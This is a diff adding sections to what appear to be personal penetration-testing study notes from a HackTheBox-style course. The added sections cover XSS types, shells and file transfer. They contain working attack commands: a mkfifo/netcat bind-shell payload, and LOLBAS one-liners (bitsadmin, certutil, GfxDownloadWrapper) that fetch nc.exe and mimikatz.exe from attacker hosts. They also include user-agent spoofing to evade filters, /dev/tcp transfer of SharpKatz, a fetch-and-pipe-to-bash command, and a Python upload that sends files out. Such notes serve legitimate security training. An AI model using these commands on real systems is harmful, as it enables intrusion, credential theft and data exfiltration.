@@ -54,6 +54,8 @@ Note that sometimes the credentials could be encrypted, in this case use `hashid
 
 A shadow hash is the encrypted password of a local host. To crack it, we need the file /etc/passwd, which contains only the users with a local account.
 
+
+
 # Enumeration
 
 ## nmap
@@ -772,6 +774,8 @@ In the documentation of Dovecot, we can find the individual [core settings](http
 #### Exploit:
 
 - If we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.
+
+
 
 ### 135 - WMI
 
@@ -1917,21 +1921,53 @@ If an SSTI exists, after submitting one of them, the web server will detect thes
 and attempt to execute them, in this instance calculating the mathematical equation 7*7, which is equal to 49.
 Even if the code is not directly executed, an error message can indicate what is the engine used. <then, go to Hacktrix.
 
+### Client-side
 
+#### XSS 
+
+- **Generalities:** 
+
+  Cross-site scripting (also known as XSS) normally allow an  attacker to masquerade as a victim user, to carry out any actions that  the user is able to perform, and to access any of the user's data. 
+
+- **Verify:**
+
+  You can confirm most kinds of XSS vulnerability by injecting a payload  that causes your own browser to execute some arbitrary JavaScript. It's  long been common practice to use the `alert()` function for this purpose because it's short, harmless, and pretty hard to miss when it's successfully called.
+
+- **Types:**
+
+  - [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) is the simplest variety of cross-site scripting. It arises when an  application receives data in an HTTP request and includes that data  within the immediate response in an unsafe way.
+  - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (also known as persistent or second-order XSS) arises when an  application receives data from an untrusted source and includes that  data within its later HTTP responses in an unsafe way.        
+  - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) (also known as [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)) arises when an application contains some client-side JavaScript that  processes data from an untrusted source in an unsafe way, usually by  writing the data back to the DOM.        
 
 #  Shells
 
-![image-20241009151501371](/home/damuna/.config/Typora/typora-user-images/image-20241009151501371.png)
+[ReverseShellGenerator](https://www.revshells.com/)
 
 ## Reverse Shell
 
-[ReverseShellGenerator](https://www.revshells.com/)
+With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.
+
+
 
 ## Bind Shell
 
-Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port.
+The `target` system has a listener started and the attacker directly connects to that port. So, there needs to be a lister opened or that we can start.
 
 We can use `netcat` to connect to that port and get a connection to the shell. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another  connection immediately. However, if the bind shell command is stopped  for any reason, or if the remote host is rebooted, we would still lose  our access to the remote host and will have to exploit it again to gain  access.
+
+1. Bind a bash shell on the target (payload)
+
+   ```bash
+   rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+   ```
+
+2. On your machine, connect though netcat
+
+   ```bash
+   nc -nv [IP] [PORT]
+   ```
+
+   
 
 ## TTY Upgrade
 
@@ -1951,7 +1987,7 @@ script -qc /bin/bash /dev/null
 
 ```bash
 # In reverse shell
-$ python -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
 Ctrl-Z	# Go to my Kali
 
 # In Kali
@@ -2199,6 +2235,36 @@ ssh root@10.10.10.10 -i key	# Login
 
 ### Download
 
+#### Native Binaries
+
+[LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
+
+**Bitsadmin**
+
+The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It  "intelligently" checks host and network utilization into account to  minimize the impact on a user's foreground work.
+
+```cmd
+bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+
+**Bitstransfer (powershell)**
+
+```powershell-session
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
+**Certutil**
+
+```cmd
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
+
+**GfxDownloadWrapper.exe**
+
+```powershell-session
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+
 #### Base64
 
 Note that Windows Command Line utility (cmd.exe) has a maximum string length of  8,191 characters. Also, a web shell may error if you attempt to send  extremely large strings. 
@@ -2280,6 +2346,16 @@ Defenders can use Web filtering solutions to prevent access to specific website 
   ```cmd
   Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
   ```
+  
+  - Evading detection:
+  
+    If some User Agents were blacklisted, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default  user agent to one emulating Internet Explorer, Firefox...
+  
+    ```powershell
+    $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+    ```
+  
+    And add the flag `-UserAgent $UserAgent` to the download command
 
 #### SMB Downloads
 
@@ -2339,6 +2415,44 @@ Defenders can use Web filtering solutions to prevent access to specific website 
    C:\htb>more file.txt
    This is a test file
    ```
+
+#### RDP
+
+If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.
+
+**If copying with xfreerdp doesn't work**
+
+1. Mount a Linux folder
+
+   ```bash
+   xfreerdp /v:[IP] /d:[DOMAIN] /u:[USER] /p:[PASSWD] /drive:linux,/home/plaintext/htb/academy/filetransfer
+   ```
+
+2. To access the directory, we can connect to `\\tsclient\`, allowing to transfer files
+
+#### PowerShell Remoting (WinRM)
+
+To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.
+
+It is useful in Active Directories, in which you have local hostnames and you want to do a lateral move.
+
+**This is only useful if you cannot directly transfer to a certain hostname**
+
+1. Transfer the file on the *pivot box*, that is the IP you can connect to
+
+1. Create a Remote session in the target machine
+
+   ```powershell
+    $Session = New-PSSession -ComputerName [HostName]
+   ```
+
+2. Transfer from the pivot box, to the hostname
+
+   ```powershell
+   Copy-Item -Path [FiLE_PATH] -ToSession $Session -Destination [PATH]
+   ```
+
+   
 
 ### Upload
 
@@ -2460,6 +2574,10 @@ Commonly enterprises don't allow the SMB protocol (TCP/445) out of  their intern
 
 ### Download
 
+#### Native binaries
+
+https://gtfobins.github.io/
+
 #### wget/cURL (file) 
 
 ```bash
@@ -2482,7 +2600,37 @@ curl [LINK] -qO- | [COMMAND]
 
 The `COMMAND` is e.g. `bash` or `python3`, that is, what executes the file in the link. Can also be used with a parser, such as `jq '.'`.
 
-**Base64**
+#### Netcat
+
+1. Start netcat on the target
+
+   ```bash
+   nc -lvnp 8000 --recv-only > [FILE]
+   ```
+
+   If the compromised machine is using Ncat,specify `--recv-only` to close the connection once the file transfer is finished.
+
+2. On our machine, we upload the file on netcat
+
+   ```bash
+   nc --send-only [IP] [PORT] < [FILE]
+   ```
+
+If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html). Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.
+
+1. Open listener on you machine
+
+   ```bash
+    sudo ncat -l -p 443 --send-only < SharpKatz.exe
+   ```
+
+2. On the target:
+
+   ```bash
+   cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+   ```
+
+#### Base64
 
 In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from  downloading a file from our machine. 
 
@@ -2606,6 +2754,120 @@ As long as Bash version 2.04 or greater is installed (compiled with  --enable-ne
 ```bash
 scp [FILE] user@targethost:[OUTPUT LOCATION]
 ```
+
+## Programming Languages
+
+### Download
+
+#### Python 
+
+```bash
+python3 -c 'import urllib.request;urllib.request.urlretrieve("[LINK]", "[FILE]")'
+```
+
+You can also use `python2.7`
+
+Notice that the `LINK` should include the path including the file.
+
+#### php
+
+File_get_contents()
+
+```bash
+php -r '$file = file_get_contents("[LINK]");file_put_contents("[FILE]",$file);'
+```
+
+Fopen()
+
+```bash
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("[LINK]", "rb"); $flocal = fopen("[FILE]", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```
+
+Pipe to Bash
+
+```bash
+php -r '$lines = @file("[LINK]"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+
+#### Ruby                                                                                                                    
+
+```bash
+ruby -e 'require "net/http"; File.write("[FILE]", Net::HTTP.get(URI.parse("[LINK]")))'
+```
+
+#### Perl                                                                                                                         
+
+```bash
+perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
+```
+
+#### Javascript
+
+1. create a file called `wget.js` and save the following content:
+
+   ```javascript
+   var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+   WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+   WinHttpReq.Send();
+   BinStream = new ActiveXObject("ADODB.Stream");
+   BinStream.Type = 1;
+   BinStream.Open();
+   BinStream.Write(WinHttpReq.ResponseBody);
+   BinStream.SaveToFile(WScript.Arguments(1));
+   ```
+
+2. Execute from Windows:
+
+   ```cmd
+   cscript.exe /nologo wget.js [LILNK] [FILE]
+   ```
+
+#### VBScript
+
+1. create a file called `wget.vbs` and save the following content:
+
+   ```vbscript
+   dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+   dim bStrm: Set bStrm = createobject("Adodb.Stream")
+   xHttp.Open "GET", WScript.Arguments.Item(0), False
+   xHttp.Send
+   
+   with bStrm
+       .type = 1
+       .open
+       .write xHttp.responseBody
+       .savetofile WScript.Arguments.Item(1), 2
+   end with
+   ```
+
+2. Execute from Windows:
+
+   ```cmd
+   cscript.exe /nologo wget.js [LILNK] [FILE]
+   ```
+
+### Upload
+
+#### Python
+
+1. Start a python server
+
+   ```bash
+   python3 -m uploadserver
+   ```
+
+2. Upload
+
+   ```bash
+   python3 -c 'import requests;requests.post("[MY URL]",files={"files":open("[FILE]","rb")})'
+   ```
+
+The same procedure holds for the other languages.
+
+## Others
+
+2. 
 
 # General Knowledge
 
